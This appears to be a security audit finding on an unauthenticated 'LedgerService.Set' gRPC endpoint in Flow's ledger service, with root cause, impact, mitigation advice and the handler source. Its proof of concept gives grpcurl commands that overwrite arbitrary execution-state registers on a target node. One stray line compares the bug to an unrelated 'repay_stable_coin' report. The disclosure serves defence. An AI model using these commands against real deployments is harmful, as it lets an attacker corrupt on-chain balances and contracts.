### Title
Unauthenticated `LedgerService.Set` gRPC Endpoint Allows Any Network Peer to Directly Overwrite Execution State - (`cmd/ledger/main.go`)

### Summary

The `LedgerService` gRPC server, introduced to support a remote ledger deployment model, exposes a `Set` RPC that directly mutates the execution state MTrie. The server is started with no TLS, no authentication interceptor, and no caller-identity check of any kind. The `Set` handler in `ledger/remote/service.go` is designed to be called exclusively by the co-located Execution Node, but nothing in the code enforces this. Any network-reachable peer that can open a TCP connection to the ledger service address can call `Set` and permanently overwrite arbitrary execution-state registers.

### Finding Description

**Root cause — no authentication on the gRPC server**

`cmd/ledger/main.go` creates the gRPC server with only message-size options:

```go
grpcServer := grpc.NewServer(
    grpc.MaxRecvMsgSize(int(*maxRequestSize)),
    grpc.MaxSendMsgSize(int(*maxResponseSize)),
)
``` [1](#0-0) 

No `grpc.Creds(...)`, no authentication interceptor, and no authorization interceptor are added. The server is then bound to a TCP address supplied via `--ledger-service-tcp` (e.g., `0.0.0.0:9000`): [2](#0-1) 

**The privileged handler — `Service.Set`**

`ledger/remote/service.go` implements the `Set` RPC. It performs only structural input validation (non-nil state hash, non-empty keys, matching lengths) and then calls directly into the underlying MTrie ledger:

```go
func (s *Service) Set(ctx context.Context, req *ledgerpb.SetRequest) (*ledgerpb.SetResponse, error) {
    // ... input validation only ...
    newState, trieUpdate, err := s.ledger.Set(update)
    ...
}
``` [3](#0-2) 

There is no check on `ctx` for peer identity, no TLS mutual-auth, and no interceptor that would restrict callers to the Execution Node. The `LedgerService` proto definition confirms `Set` is a plain unary RPC with no security annotations: [4](#0-3) 

**Contrast with the intended trust model**

The `ledger/remote/client.go` `Client.Set` is the only intended caller — it is the Execution Node's internal ledger client. The service is architecturally meant to be a private IPC channel between the Execution Node process and the ledger process. The TCP transport option (`--ledger-service-tcp`) is explicitly documented and supported for network-separated deployments: [5](#0-4) 

Yet the server carries no mechanism to enforce that only the Execution Node may connect.

**Analog to the reported vulnerability**

The reported bug: `repay_stable_coin` was designed to be called only by `stable_pool`, but accepted calls from any address. Here: `LedgerService.Set` is designed to be called only by the Execution Node, but accepts calls from any TCP peer.

### Impact Explanation

The MTrie ledger is the canonical execution state of the Flow blockchain. A successful `Set` call can overwrite any register at any state root, including:

- Account token balances (corrupting FLOW holdings)
- Smart contract bytecode and storage (corrupting or replacing deployed contracts)
- Any other on-chain state register

Because the ledger is append-only via WAL and the new state root is returned to the Execution Node as authoritative, a forged `Set` call produces a new state root that the Execution Node will use for subsequent block execution. This constitutes a **critical integrity failure in the execution state** — unauthorized mutation of on-chain assets and contract state without any valid transaction.

### Likelihood Explanation

The TCP listener is an explicitly supported, documented deployment option (`--ledger-service-tcp 0.0.0.0:9000`). Any deployment where the ledger service TCP port is reachable from outside the Execution Node's local network — a misconfigured container, a cloud VM with an open security group, or a co-located attacker — is immediately exploitable with a single unauthenticated gRPC call. No credentials, no keys, and no protocol participation are required.

### Recommendation

1. **Mutual TLS**: Require the Execution Node to present a client certificate when connecting, and configure the ledger service to reject connections without a valid certificate. Use the existing `grpcutils` TLS infrastructure already present in the codebase.
2. **Restrict to Unix socket only for local deployments**: Prefer `--ledger-service-socket` over `--ledger-service-tcp` wherever the Execution Node and ledger service are co-located; OS file permissions on the socket provide access control.
3. **Add a gRPC authentication interceptor**: Even for TCP, add a server-side interceptor that validates a shared secret or mutual TLS peer identity before dispatching any RPC.

### Proof of Concept

Given a ledger service started with `--ledger-service-tcp 0.0.0.0:9000`:

```bash
# 1. Discover the current state root (read-only, also unauthenticated)
grpcurl -plaintext -d '{}' TARGET:9000 ledger.LedgerService/InitialState

# 2. Overwrite an arbitrary register (e.g., an account's storage register)
grpcurl -plaintext -d '{
  "state": {"hash": "<hex_of_current_state_root>"},
  "keys": [{
    "parts": [
      {"type": 0, "value": "<hex_account_address>"},
      {"type": 2, "value": "<hex_register_key>"}
    ]
  }],
  "values": [{"data": "<hex_arbitrary_payload>", "is_nil": false}]
}' TARGET:9000 ledger.LedgerService/Set
```

The call succeeds and returns a new state root. The Execution Node will use this corrupted root for all subsequent block execution, permanently embedding the attacker-controlled register value into the execution state.

```go
func (s *Service) Set(ctx context.Context, req *ledgerpb.SetRequest) (*ledgerpb.SetResponse, error) {
	if req.State == nil || len(req.State.Hash) != len(ledger.State{}) {
		return nil, status.Error(codes.InvalidArgument, "invalid state")
	}

	if len(req.Keys) == 0 {
		return nil, status.Error(codes.InvalidArgument, "keys cannot be empty")
	}

	if len(req.Keys) != len(req.Values) {
		return nil, status.Error(codes.InvalidArgument, "keys and values length mismatch")
	}

	var state ledger.State
	copy(state[:], req.State.Hash)

	keys := make([]ledger.Key, len(req.Keys))
	for i, protoKey := range req.Keys {
		key, err := protoKeyToLedgerKey(protoKey)
		if err != nil {
			return nil, err // protoKeyToLedgerKey already returns status.Error
		}
		keys[i] = key
	}

	values := make([]ledger.Value, len(req.Values))
	for i, protoValue := range req.Values {
		var value ledger.Value
		// Reconstruct the original value type using is_nil flag
		// This preserves the distinction between nil and []byte{} that protobuf loses
		if len(protoValue.Data) == 0 {
			if protoValue.IsNil {
				// Original value was nil
				value = nil
			} else {
				// Original value was []byte{} (empty slice)
				value = ledger.Value([]byte{})
			}
		} else {
			// Non-empty value, use data as-is
			value = ledger.Value(protoValue.Data)
		}
		values[i] = value
	}

	update, err := ledger.NewUpdate(state, keys, values)
	if err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	}

	newState, trieUpdate, err := s.ledger.Set(update)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}

	// Encode trie update using centralized encoding function to ensure
	// client and server use the same encoding method
	trieUpdateBytes := encodeTrieUpdateForTransport(trieUpdate)

	return &ledgerpb.SetResponse{
		NewState: &ledgerpb.State{
			Hash: newState[:],
		},
		TrieUpdate: trieUpdateBytes,
	}, nil
}
```
